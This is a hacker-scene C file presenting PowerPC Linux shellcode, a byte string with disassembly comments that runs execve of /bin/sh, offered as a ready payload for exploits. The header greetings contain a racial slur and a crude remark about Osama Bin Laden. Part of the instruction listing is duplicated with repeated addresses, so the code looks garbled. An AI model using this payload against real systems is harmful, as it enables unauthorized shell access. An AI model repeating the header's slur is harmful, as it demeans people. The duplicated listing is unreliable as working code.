# This file should be accompanied by execve.s and verify.txt
# This asm is for MacRISC processors running linux-ppc 
# execve of /bin/sh with no setuid(0) or other fancy bells
# it even has nulls for you to play with...good luck
# shoutz: b10z and my negro applec0re
# thankz: to palante <don@sabotage.org>  for ppc.shellcode.txt  and
#    lamagra <lamagra@uglypig.org>  for m68koverflows.txt 
# fukz: to Osama Bin Ladin and his band of thugz for bombing the WTC
# code by: dotslash@snosoft.com 
# \x2e\x2f

char shellcode[] =
					/* 10000280 <main>: 			*/
	"\x94\x21\xff\xf0"		/* 10000280: stwu	r1,-16(r1)		*/
	"\x7c\x08\x02\xa6"		/* 10000284: mflr	r0			*/
	"\x93\xe1\x00\x0c"		/* 10000288: stw	r31,12(r1)		*/
	"\x90\x01\x00\x14"		/* 1000028c: stw	r0,20(r1)		*/
	"\x7c\x3f\x0b\x78"		/* 10000290: mr	r31,r1			*/
	"\x2f\x62\x69\x6e"		/* 10000294: cmpdi	cr6,r2,26990		*/
	"\x2f\x73\x68\x00"		/* 10000298: cmpdi	cr6,r19,26624	*/
	"\x48\x00\x00\x1d"		/* 1000029c: bl	100002b8 <shell>	*/
	"\x81\x61\x00\x00"		/* 100002a0: lwz	r11,0(r1)		*/
	"\x80\x0b\x00\x04"		/* 100002a4: lwz	r0,4(r11)		*/
	"\x7c\x08\x03\xa6"		/* 100002a8: mtlr	r0			*/
	"\x83\xeb\xff\xfc"		/* 100002ac: lwz	r31,-4(r11)		*/
	"\x7d\x61\x5b\x78"		/* 100002b0: mr	r1,r11			*/
	"\x4e\x80\x00\x20"		/* 100002b4: blr			*/

	"\x48\x00\x00\x1d"		/* 1000029c: bl	100002b8 <shell>	*/
	"\x81\x61\x00\x00"		/* 100002a0: lwz	r11,0(r1)		*/
	"\x80\x0b\x00\x04"		/* 100002a4: lwz	r0,4(r11)		*/
	"\x7c\x08\x03\xa6"		/* 100002a8: mtlr	r0			*/
	"\x83\xeb\xff\xfc"		/* 100002ac: lwz	r31,-4(r11)		*/
	"\x7d\x61\x5b\x78"		/* 100002b0: mr	r1,r11			*/
	"\x4e\x80\x00\x20"		/* 100002b4: blr			*/

					/* 100002b8 <shell>: 			*/
	"\x7c\x68\x02\xa6"		/* 100002b8: mflr	r3			*/
	"\x38\x63\xff\xd8"		/* 100002bc: addi	r3,r3,-40		*/
	"\x38\xa0\x00\x00"		/* 100002c0: li	r5,0			*/
	"\x38\x00\x00\x0b"		/* 100002c4: li	r0,11			*/
	"\x44\x00\x00\x02";		/* 100002c8: sc				*/

void main() 
{ 
  __asm__("b shellcode"); 
}  
